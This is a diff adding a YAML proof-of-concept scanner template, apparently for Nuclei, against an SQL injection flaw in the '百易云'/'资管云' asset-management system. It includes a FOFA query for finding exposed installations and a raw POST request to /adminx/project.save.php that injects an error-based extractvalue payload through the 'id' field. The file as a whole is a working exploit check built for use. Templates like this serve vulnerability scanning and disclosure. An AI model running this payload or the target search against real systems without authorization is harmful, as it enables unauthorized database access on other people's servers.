@@ -1,0 +1,26 @@
+id: poc-daoggd2s2y36nxm4
+info:
+  name: 百易云save存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/daoggd2s2y36nxm4'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: daoggd2s2y36nxm4
+    fofa: body="media/css/uniform.default.css" && body="资管云"||body="不要着急，点此"||title="资管云"
+http:
+- raw:
+  - 'POST /adminx/project.save.php HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Host: {{Hostname}}
+
+
+    id=1+AND+extractvalue(1,concat(0x7e,md5(123)))'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
